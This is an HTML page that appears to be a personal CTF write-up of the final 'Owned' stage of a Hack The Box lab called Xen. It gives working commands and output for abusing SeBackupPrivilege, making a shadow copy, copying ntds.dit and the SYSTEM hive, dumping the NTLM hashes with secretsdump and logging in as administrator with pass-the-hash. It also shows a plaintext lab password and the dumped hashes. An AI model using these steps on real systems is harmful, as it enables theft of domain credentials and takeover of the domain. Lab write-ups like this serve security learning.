<!DOCTYPE html>
<html><head><title>CTFLover hack stuff | CTF solutions</title><base href="./"/><meta id="root-path" root-path="./"/><link href="/images/favicon.jpeg" rel="icon" sizes="96x96"/><meta content="width=device-width,initial-scale=1,user-scalable=yes,minimum-scale=1,maximum-scale=5" name="viewport"/><meta charset="utf-8"/><link href="lib/styles/obsidian-styles.css" rel="stylesheet"/><link href="lib/styles/theme.css" rel="stylesheet"/><link href="lib/styles/plugin-styles.css" rel="stylesheet"/><link href="lib/styles/snippets.css" rel="stylesheet"/><link href="lib/styles/generated-styles.css" rel="stylesheet"/><style></style><script src="lib/scripts/graph_view.js" type="module"></script><script src="lib/scripts/graph_wasm.js"></script><script src="lib/scripts/tinycolor.js"></script><script crossorigin="anonymous" integrity="sha512-Ch/O6kL8BqUwAfCF7Ie5SX1Hin+BJgYH4pNjRqXdTEqMsis1TUYg+j6nnI9uduPjGaj7DN4UKCZgpvoExt6dkw==" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script><script src="lib/scripts/webpage.js"></script><script src="lib/scripts/generated.js"></script></head><body class="theme-dark mod-linux show-inline-title loading"><div class="webpage-container"><div class="sidebar-left sidebar"><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" id="theme_toggle" type="checkbox"/><div class="toggle-background"></div></label></div><div class="tree-container file-tree mod-nav-indicator" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Xen</span><button class="clickable-icon collapse-tree-button is-collapsed"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="05-nmap.html"><span class="tree-item-title">05-Nmap</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="10-enumeration.html"><span class="tree-item-title">10-Enumeration</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="15-smtp.html"><span class="tree-item-title">15-SMTP</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="20-citrix.html"><span class="tree-item-title">20-Citrix</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="25-getting-shell.html"><span class="tree-item-title">25-Getting Shell</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="30-deploy.html"><span class="tree-item-title">30-Deploy</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="35-ghost.html"><span class="tree-item-title">35-Ghost</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="40-camouflage.html"><span class="tree-item-title">40-Camouflage</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="45-doppelgänger.html"><span class="tree-item-title">45-Doppelgänger</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="50-owned.html"><span class="tree-item-title">50-Owned</span></a></div><div class="tree-item-children"></div></div><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="creds.html"><span class="tree-item-title">creds</span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div></div><div class="document-container show"><div class="markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings show-indentation-guide allow-fold-lists show-properties" style="tab-size:4" tabindex="-1"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="markdown-preview-pusher" style="width:1px;height:.1px;margin-bottom:0"></div><div class="mod-header"><div class="inline-title" data-heading="50-Owned" id="50-Owned" style="display:block">50-Owned</div></div><div><p>bsic enumeration -</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">*Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code><button class="copy-code-button">Copy</button></pre></div><div><p>To exploit this i followed<br/><a class="external-link" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" rel="noopener" target="_blank">https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/</a></p></div><div><p>Transfering a file via evil-winrm was a pain ..<br/>I started a share on citrix, and accessed it from dc as dc was not able to reach my kali machine directly.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">C:\ProgramData&gt; net share df=c:\programdata /grant:everyone,FULL
 net share df=c:\programdata /grant:everyone,FULL        
df was shared successfully.                                        
</code><button class="copy-code-button">Copy</button></pre></div><div><p>One DC</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">*Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; net use \\172.16.249.205\df /user:htb\mturner 4install! 
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:5985  ...  OK
The command completed successfully.
</code><button class="copy-code-button">Copy</button></pre></div><div><p>I need to get the ntds.dit file but i cannot directly access it because when the machine is on we generally cannot copy it.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">*Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; diskshadow /s hello.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  1/22/2024 10:04:23 AM

-&gt; set context persistent nowriters
-&gt; add volume c: alias hello
-&gt; create
Alias hello for shadow ID {e541b08e-5a9b-4212-b92b-fc68ed009e78} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {1d5592fd-faa1-43d9-9d34-0f8a8e4d83a3} set as environment variable.

Querying all shadow copies with the shadow copy set ID {1d5592fd-faa1-43d9-9d34-0f8a8e4d83a3}

        * Shadow copy ID = {e541b08e-5a9b-4212-b92b-fc68ed009e78}               %hello%
                - Shadow copy set: {1d5592fd-faa1-43d9-9d34-0f8a8e4d83a3}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{78d1dcbd-51bd-4ccf-907c-aa32152ad3f2}\ [C:\]
                - Creation time: 1/22/2024 10:04:23 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC.htb.local
                - Service machine: DC.htb.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %hello% z:
-&gt; %hello% = {e541b08e-5a9b-4212-b92b-fc68ed009e78}
The shadow copy was successfully exposed as z:\.
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">reg save hklm\system system
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">*Evil-WinRM* PS C:\Users\backup-svc\Documents&gt; robocopy /b z:\windows\ntds . ntds.dit                                                  
                                                                   
-------------------------------------------------------------------------------                                                        
   ROBOCOPY     ::     Robust File Copy for Windows                
-------------------------------------------------------------------------------                                                                                                                                                                                               
                                                                   
  Started : Monday, January 22, 2024 10:04:49 AM                   
   Source : z:\windows\ntds\                                       
     Dest : C:\Users\backup-svc\Documents\                                                                                             
                                                                   
    Files : ntds.dit                                               
                                                                   
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30                
                                                                                                                                       
------------------------------------------------------------------------------                                                         
                           1    z:\windows\ntds\                                                                                       
            New File              16.0 m        ntds.dit                                                                               
  0.0%                                                                                                                                 
  0.3%                                                                                                                                 
  100%
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Copied system and ntds to citrix.</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">copy ntds.dit \\172.16.249.205\df\ntds.dit
copy system \\172.16.249.205\df\system
</code><button class="copy-code-button">Copy</button></pre></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">meterpreter &gt; download system
[*] Downloading: system -&gt; /home/nakul/Desktop/ctf/htb-EndGames/Xen/system
[*] Downloaded 1.00 MiB of 12.75 MiB (7.84%): system -&gt; /home/nakul/Desktop/ctf/htb-EndGames/Xen/system
[*] Downloaded 2.00 MiB of 12.75 MiB (15.68%): system -&gt; /home/nakul/Desktop/ctf/htb-EndGames/Xen/system
[*] Downloaded 3.00 MiB of 12.75 MiB (23.52%): system -&gt; /home/nakul/D
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Dumped the hashes.</p></div><div><pre class="language-css" tabindex="0"><code class="language-css is-loaded">➜  Xen impacket-secretsdump -ntds ntds.dit -system system LOCAL                                                                        
Impacket v0.11.0 <span class="token operator">-</span> Copyright <span class="token number">2023</span> Fortra                                                                                               
                                                                                                                                       
[*] Target system <span class="token property">bootKey</span><span class="token punctuation">:</span> <span class="token number">0</span>x6e398137ec7f2e204671dad7c778509f                                                                          
[*] Dumping Domain Credentials <span class="token punctuation">(</span>domain\<span class="token property">uid</span><span class="token punctuation">:</span><span class="token property">rid</span><span class="token punctuation">:</span><span class="token property">lmhash</span><span class="token punctuation">:</span>nthash<span class="token punctuation">)</span>                                                                          
[*] Searching for pekList<span class="token punctuation">,</span> be patient                                                                                                  
[*] PEK # <span class="token number">0</span> found and <span class="token property">decrypted</span><span class="token punctuation">:</span> <span class="token number">4</span>a62a0ac1475b54add921ac8c1b72e31                                                                      
[*] Reading and decrypting hashes from ntds.dit                                                                                        
<span class="token property">Administrator</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">822601</span>ccd7155f47cd955b94af1558be<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>                                                 
<span class="token property">Guest</span><span class="token punctuation">:</span><span class="token number">501</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">31</span>d6cfe0d16ae931b73c59d7e0c089c0<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
DC$<span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">5</span>e507509602e1b651759527b87b6c347<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">krbtgt</span><span class="token punctuation">:</span><span class="token number">502</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">3791</span>ca8d70c9e1d2d2c7c5b5c7c253e8<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
CITRIX$<span class="token punctuation">:</span><span class="token number">1103</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token property">fd981d0c915932bb3ddf38b415c49121</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
htb.local\<span class="token property">alarsson</span><span class="token punctuation">:</span><span class="token number">1104</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">92</span>a44f1aa6259c55f9f514fabae5cc3f<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
htb.local\<span class="token property">jmendes</span><span class="token punctuation">:</span><span class="token number">1106</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">10</span>d0c05f7d958955f0eaf1479b5124a0<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
htb.local\<span class="token property">pmorgan</span><span class="token punctuation">:</span><span class="token number">1107</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">8618</span>ba932416a7404a854b250bf28577<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
htb.local\<span class="token property">awardel</span><span class="token punctuation">:</span><span class="token number">1108</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token number">270</span>e4d446437f4383b092b42a9f88f0a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Root -&gt;</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Xen proxychains impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be administrator@172.16.249.200

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.11.0 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.249.200:49666  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
htb\administrator

C:\&gt;type C:\users\administrator\Desktop\flag.txt
XEN{d3r1v471v3...1n_4dm1n} 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Finally.</p></div><div class="mod-footer"></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg class="svg-icon" fill="none" height="100%" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder"><div class="graph-view-container"><div aria-label="Expand" class="graph-icon graph-expand" data-tooltip-position="top" role="button"><svg class="svg-icon" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="7" x2="17" y1="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div><canvas height="512px" id="graph-canvas" width="512px"></canvas></div></div></div><div class="tree-container outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"></div></div></div></div></div></div></div></div></body></html>